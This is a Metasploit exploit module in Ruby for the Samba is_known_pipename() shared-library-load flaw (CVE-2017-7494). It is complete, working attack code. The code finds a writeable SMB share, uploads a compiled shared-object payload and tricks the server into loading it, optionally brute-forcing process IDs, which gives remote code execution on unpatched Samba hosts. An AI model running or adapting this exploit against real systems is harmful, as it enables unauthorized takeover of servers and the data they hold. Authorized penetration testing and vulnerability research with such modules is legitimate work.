##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Samba is_known_pipename() Arbitrary Module Load',
      'Description'    => %q{
          This module triggers an arbitrary shared library load vulnerability
        in Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4. This module
        requires valid credentials, a writeable folder in an accessible share,
        and knowledge of the server-side path of the writeable folder. In
        some cases, anonymous access combined with common filesystem locations
        can be used to automatically exploit this vulnerability.
      },
      'Author'         =>
        [
          'steelo <knownsteelo[at]gmail.com>',    # Vulnerability Discovery
          'hdm',                                  # Metasploit Module
          'Brendan Coles <bcoles[at]gmail.com>',  # Check logic
          'Tavis Ormandy <taviso[at]google.com>', # PID hunting technique
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2017-7494' ],
          [ 'URL', 'https://www.samba.org/samba/security/CVE-2017-7494.html' ],
        ],
      'Payload'         =>
        {
          'Space'       => 9000,
          'DisableNops' => true
        },
      'Platform'        => 'linux',
      #
      # Targets are currently limited by platforms with ELF-SO payload wrappers
      #
      'Targets'         =>
        [

          [ 'Linux x86',        { 'Arch' => ARCH_X86 } ],
          [ 'Linux x86_64',     { 'Arch' => ARCH_X64 } ],
          #
          # Not ready yet
          # [ 'Linux ARM (LE)',   { 'Arch' => ARCH_ARMLE } ],
          # [ 'Linux MIPS',       { 'Arch' => MIPS } ],
        ],
      'Privileged'      => true,
      'DisclosureDate'  => 'Mar 24 2017',
      'DefaultTarget'   => 1))

    register_options(
      [
        OptString.new('SMB_SHARE_NAME', [false, 'The name of the SMB share containing a writeable directory']),
        OptString.new('SMB_SHARE_BASE', [false, 'The remote filesystem path correlating with the SMB share name']),
        OptString.new('SMB_FOLDER', [false, 'The directory to use within the writeable SMB share']),
      ])

    register_advanced_options(
      [
        OptBool.new('BruteforcePID', [false, 'Attempt to use two connections to bruteforce the PID working directory', false]),
      ])
  end


  def generate_common_locations
    candidates = []
    if datastore['SMB_SHARE_BASE'].to_s.length > 0
      candidates << datastore['SMB_SHARE_BASE']
    end

    %W{ /volume1 /volume2 /volume3 /volume4
        /shared /mnt /mnt/usb /media /mnt/media
        /var/samba /tmp /home /home/shared
    }.each do |base_name|
      candidates << base_name
      candidates << [base_name, @share]
      candidates << [base_name, @share.downcase]
      candidates << [base_name, @share.upcase]
      candidates << [base_name, @share.capitalize]
      candidates << [base_name, @share.gsub(" ", "_")]
    end

    candidates.uniq
  end

  def enumerate_directories(share)
    begin
      self.simple.connect("\\\\#{rhost}\\#{share}")
      stuff = self.simple.client.find_first("\\*")
      directories = [""]
      stuff.each_pair do |entry,entry_attr|
        next if %W{. ..}.include?(entry)
        next unless entry_attr['type'] == 'D'
        directories << entry
      end

      return directories

    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Enum #{share}: #{e}")
      return nil

    ensure
      if self.simple.shares["\\\\#{rhost}\\#{share}"]
        self.simple.disconnect("\\\\#{rhost}\\#{share}")
      end
    end
  end

  def verify_writeable_directory(share, directory="")
    begin
      self.simple.connect("\\\\#{rhost}\\#{share}")

      random_filename = Rex::Text.rand_text_alpha(5)+".txt"
      filename = directory.length == 0 ? "\\#{random_filename}" : "\\#{directory}\\#{random_filename}"

      wfd = simple.open(filename, 'rwct')
      wfd << Rex::Text.rand_text_alpha(8)
      wfd.close

      simple.delete(filename)
      return true

    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Write #{share}#{filename}: #{e}")
      return false

    ensure
      if self.simple.shares["\\\\#{rhost}\\#{share}"]
        self.simple.disconnect("\\\\#{rhost}\\#{share}")
      end
    end
  end

  def share_type(val)
    [ 'DISK', 'PRINTER', 'DEVICE', 'IPC', 'SPECIAL', 'TEMPORARY' ][val]
  end

  def enumerate_shares_lanman
    shares = []
    begin
      res = self.simple.client.trans(
        "\\PIPE\\LANMAN",
        (
          [0x00].pack('v') +
          "WrLeh\x00"   +
          "B13BWz\x00"  +
          [0x01, 65406].pack("vv")
        ))
    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Could not enumerate shares via LANMAN")
      return []
    end
    if res.nil?
      vprint_error("Could not enumerate shares via LANMAN")
      return []
    end

    lerror, lconv, lentries, lcount = res['Payload'].to_s[
      res['Payload'].v['ParamOffset'],
      res['Payload'].v['ParamCount']
    ].unpack("v4")

    data = res['Payload'].to_s[
      res['Payload'].v['DataOffset'],
      res['Payload'].v['DataCount']
    ]

    0.upto(lentries - 1) do |i|
      sname,tmp = data[(i * 20) +  0, 14].split("\x00")
      stype     = data[(i * 20) + 14, 2].unpack('v')[0]
      scoff     = data[(i * 20) + 16, 2].unpack('v')[0]
      scoff -= lconv if lconv != 0
      scomm,tmp = data[scoff, data.length - scoff].split("\x00")
      shares << [ sname, share_type(stype), scomm]
    end

    shares
  end

  def probe_module_path(path, simple_client=self.simple)
    begin
      simple_client.create_pipe(path)
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("Probe: #{path}: #{e}")
    end
  end

  def find_writeable_path(share)
    subdirs = enumerate_directories(share)
    return unless subdirs

    if datastore['SMB_FOLDER'].to_s.length > 0
      subdirs.unshift(datastore['SMB_FOLDER'])
    end

    subdirs.each do |subdir|
      next unless verify_writeable_directory(share, subdir)
      return subdir
    end

    nil
  end

  def find_writeable_share_path
    @path = nil
    share_info = enumerate_shares_lanman
    if datastore['SMB_SHARE_NAME'].to_s.length > 0
      share_info.unshift [datastore['SMB_SHARE_NAME'], 'DISK', '']
    end

    share_info.each do |share|
      next if share.first.upcase == 'IPC$'
      found = find_writeable_path(share.first)
      next unless found
      @share = share.first
      @path  = found
      break
    end
  end

  def find_writeable
    find_writeable_share_path
    unless @share && @path
      print_error("No suiteable share and path were found, try setting SMB_SHARE_NAME and SMB_FOLDER")
      fail_with(Failure::NoTarget, "No matching target")
    end
    print_status("Using location \\\\#{rhost}\\#{@share}\\#{@path} for the path")
  end

  def upload_payload
    begin
      self.simple.connect("\\\\#{rhost}\\#{@share}")

      random_filename = Rex::Text.rand_text_alpha(8)+".so"
      filename = @path.length == 0 ? "\\#{random_filename}" : "\\#{@path}\\#{random_filename}"
      wfd = simple.open(filename, 'rwct')
      wfd << Msf::Util::EXE.to_executable_fmt(framework, target.arch, target.platform,
        payload.encoded, "elf-so", {:arch => target.arch, :platform => target.platform}
      )
      wfd.close

      @payload_name = random_filename
      return true

    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      print_error("Write #{@share}#{filename}: #{e}")
      return false

    ensure
      if self.simple.shares["\\\\#{rhost}\\#{@share}"]
        self.simple.disconnect("\\\\#{rhost}\\#{@share}")
      end
    end
  end

  def find_payload

    # Reconnect to IPC$
    simple.connect("\\\\#{rhost}\\IPC$")

    # Look for common paths first, since they can be a lot quicker than hunting PIDs
    print_status("Hunting for payload using common path names: #{@payload_name} - //#{rhost}/#{@share}/#{@path}")
    generate_common_locations.each do |location|
      target = [location, @path, @payload_name].join("/").gsub(/\/+/, '/')
      print_status("Trying location #{target}...")
      probe_module_path(target)
    end

    # Exit early if we already have a session
    return if session_created?

    return unless datastore['BruteforcePID']

    # XXX: This technique doesn't seem to work in practice, as both processes have setuid()d
    #      to non-root, but their /proc/pid directories are still owned by root. Trying to
    #      read the /proc/other-pid/cwd/target.so results in permission denied. There is a
    #      good chance that this still works on some embedded systems and odd-ball Linux.

    # Use the PID hunting strategy devised by Tavis Ormandy
    print_status("Hunting for payload using PID search: #{@payload_name} - //#{rhost}/#{@share}/#{@path} (UNLIKELY TO WORK!)")

    # Configure the main connection to have a working directory of the file share
    simple.connect("\\\\#{rhost}\\#{@share}")

    # Use a second connection to brute force the PID of the first connection
    probe_conn = connect(false)
    smb_login(probe_conn)
    probe_conn.connect("\\\\#{rhost}\\#{@share}")
    probe_conn.connect("\\\\#{rhost}\\IPC$")

    # Run from 2 to MAX_PID (ushort) trying to read the other process CWD
    2.upto(32768) do |pid|

      # Look for the PID associated with our main SMB connection
      target = ["/proc/#{pid}/cwd", @path, @payload_name].join("/").gsub(/\/+/, '/')
      vprint_status("Trying PID with target path #{target}...")
      probe_module_path(target, probe_conn)

      # Keep our main connection alive
      if pid % 1000 == 0
         self.simple.client.find_first("\\*")
      end
    end

  end

  def check
    res = smb_fingerprint

    unless res['native_lm'] =~ /Samba ([\d\.]+)/
      print_error("does not appear to be Samba: #{res['os']} / #{res['native_lm']}")
      return CheckCode::Safe
    end

    samba_version = Gem::Version.new($1.gsub(/\.$/, ''))

    vprint_status("Samba version identified as #{samba_version.to_s}")

    if samba_version < Gem::Version.new('3.5.0')
      return CheckCode::Safe
    end

    # Patched in 4.4.14
    if samba_version < Gem::Version.new('4.5.0') &&
       samba_version >= Gem::Version.new('4.4.14')
      return CheckCode::Safe
    end

    # Patched in 4.5.10
    if samba_version > Gem::Version.new('4.5.0') &&
       samba_version < Gem::Version.new('4.6.0') &&
       samba_version >= Gem::Version.new('4.5.10')
      return CheckCode::Safe
    end

    # Patched in 4.6.4
    if samba_version >= Gem::Version.new('4.6.4')
      return CheckCode::Safe
    end

    connect
    smb_login
    find_writeable_share_path
    disconnect

    if @share.to_s.length == 0
      print_status("Samba version #{samba_version.to_s} found, but no writeable share has been identified")
      return CheckCode::Detected
    end

    print_good("Samba version #{samba_version.to_s} found with writeable share '#{@share}'")
    return CheckCode::Appears
  end

  def exploit
    # Setup SMB
    connect
    smb_login

    # Find a writeable share
    find_writeable

    # Upload the shared library payload
    upload_payload

    # Find and execute the payload from the share
    begin
      find_payload
    rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply
    end

    # Cleanup the payload
    begin
      simple.connect("\\\\#{rhost}\\#{@share}")
      uploaded_path = @path.length == 0 ? "\\#{@payload_name}" : "\\#{@path}\\#{@payload_name}"
      simple.delete(uploaded_path)
    rescue Rex::StreamClosedError, Rex::Proto::SMB::Exceptions::NoReply
    end

    # Shutdown
    disconnect
  end

end
